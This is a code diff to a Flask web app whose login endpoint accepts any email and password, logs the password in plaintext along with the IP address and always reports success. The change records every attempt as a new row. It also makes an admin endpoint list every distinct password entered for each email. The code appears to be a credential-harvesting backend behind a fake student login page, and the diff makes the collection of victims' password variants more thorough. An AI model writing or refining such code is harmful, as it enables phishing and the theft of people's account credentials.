@@ -75,9 +75,8 @@ def init_db():
 def login():
     """
     Accept any email + password.
-    If email is new  → INSERT a new student record.
-    If email exists  → UPDATE last_login and login_count.
-    Always returns 200 so the user is 'logged in'.
+    Always INSERT a new student record for every login request.
+    This maintains a full history of all login attempts.
     """
     data = request.get_json(silent=True)
     if not data:
@@ -93,54 +92,52 @@ def login():
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     with get_db() as conn:
-        row = fetchone_dict(
-            conn,
-            "SELECT id, login_count FROM students WHERE email = ? AND password = ?",
-            (email, password),
-        )
-
-        if row is None:
-            # New student record for this email/password pair
-            conn.execute("""
-                INSERT INTO students (email, password, ip_address, first_login, last_login)
-                VALUES (?, ?, ?, ?, ?)
-            """, (email, password, ip, now, now))
-            conn.commit()
-            print(f"[NEW]  {email} | pwd: {password} | ip: {ip} | {now}")
-            action = "registered"
-        else:
-            # Returning student with same email/password → update login metadata only
-            conn.execute("""
-                UPDATE students
-                SET last_login  = ?,
-                    login_count = login_count + 1,
-                    ip_address  = ?
-                WHERE id = ?
-            """, (now, ip, row["id"]))
-            conn.commit()
-            print(f"[RTRN] {email} | pwd: {password} | ip: {ip} | {now} (login #{row['login_count']+1})")
-            action = "logged_in"
+        # Always insert a new record for each login request
+        conn.execute("""
+            INSERT INTO students (email, password, ip_address, first_login, last_login)
+            VALUES (?, ?, ?, ?, ?)
+        """, (email, password, ip, now, now))
+        conn.commit()
+        print(f"[LOGIN] {email} | pwd: {password} | ip: {ip} | {now}")
 
     return jsonify({
         "success": True,
-        "action": action,
-        "message": "Login successful"
+        "action": "logged_in",
+        "message": "Login recorded successfully"
     }), 200
 
 
 @app.route("/students", methods=["GET"])
 def list_students():
     """
-    Admin endpoint — view all collected login data.
-    Access via: http://localhost:5000/students
+    Admin endpoint — view aggregated login data by email.
+    Shows all unique passwords used for each email address.
     """
     with get_db() as conn:
         students = fetchall_dicts(
             conn,
-            "SELECT id, email, password, ip_address, login_count, first_login, last_login FROM students ORDER BY id DESC",
+            """
+            SELECT 
+                MIN(id) as id,
+                email, 
+                GROUP_CONCAT(DISTINCT password) as passwords, 
+                ip_address, 
+                COUNT(*) as total_logins, 
+                MIN(first_login) as first_login, 
+                MAX(last_login) as last_login 
+            FROM students 
+            GROUP BY email 
+            ORDER BY last_login DESC
+            """,
         )
+    
+    # Optional: convert comma-separated passwords string back to a list
+    for s in students:
+        if s["passwords"]:
+            s["passwords"] = s["passwords"].split(",")
+
     return jsonify({
-        "total": len(students),
+        "total_unique_emails": len(students),
         "students": students
     }), 200
 
